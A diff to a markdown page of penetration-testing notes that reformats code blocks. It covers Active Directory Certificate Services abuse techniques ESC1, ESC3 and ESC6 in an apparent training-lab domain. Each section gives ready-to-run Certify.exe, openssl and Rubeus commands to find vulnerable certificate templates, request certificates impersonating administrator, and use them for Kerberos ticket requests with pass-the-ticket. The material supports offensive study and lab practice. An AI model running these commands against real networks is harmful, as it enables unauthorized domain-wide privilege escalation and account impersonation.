@@ -33,26 +33,31 @@ Certify.exe find /vulnerable
 
 ESC1 is when a certificate template permits Client Authentication and allows the enrollee to supply an arbitrary Subject Alternative Name (SAN).
 
-<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"># Find vul template
+{% code overflow="wrap" %}
+```powershell
+# Find vul template
 Certify.exe find /enrolleeSuppliesSubject
 
 # Request cert
 Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
 
-<strong># Convert it to pfx and set password
-</strong>openssl pkcs12 -in esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc1.pfx
+# Convert it to pfx and set password
+openssl pkcs12 -in esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc1.pfx
 
 # Request TGT using the cert
 Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:123456 /ptt
-</code></pre>
+```
+{% endcode %}
 
 ### ESC3
 
 ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users.
 
-<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"># Find vul template
-<strong>Certify.exe find /vulnerable
-</strong>
+{% code overflow="wrap" %}
+```powershell
+# Find vul template
+Certify.exe find /vulnerable
+
 # Request a certificate based on vulnerable template
 Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:vulnerable-template
 
@@ -68,23 +73,27 @@ openssl pkcs12 -in esc3agent.pem -keyex -CSP "Microsoft Enhanced Cryptographic P
 # Get TGT using the pfx certificate
 Rubeus.exe asktgt /user:administrator /certificate:esc3.pfx /password:123456 /ptt
 
-</code></pre>
+```
+{% endcode %}
 
 ### ESC6
 
 ESC6 is when the CA specifies the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag. \
 This flag allows the enrollee to specify an arbitrary  Subject Alternative Name (SAN) on all certificates despite a certificate template's configuration.
 
-<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"># Find vul template
+{% code overflow="wrap" %}
+```powershell
+# Find vul template
 Certify.exe find 
 
 # Request cert
-Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DCCA /template:&#x3C;vul_template> /altname:administrator
+Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DCCA /template:<vul_template> /altname:administrator
 
-<strong># Convert it to pfx and set password
-</strong>openssl pkcs12 -in esc6.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc6.pfx
+# Convert it to pfx and set password
+openssl pkcs12 -in esc6.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc6.pfx
 
 # Request TGT using the cert
 Rubeus.exe asktgt /user:administrator /certificate:esc6.pfx /password:123456 /ptt
-</code></pre>
+```
+{% endcode %}
 
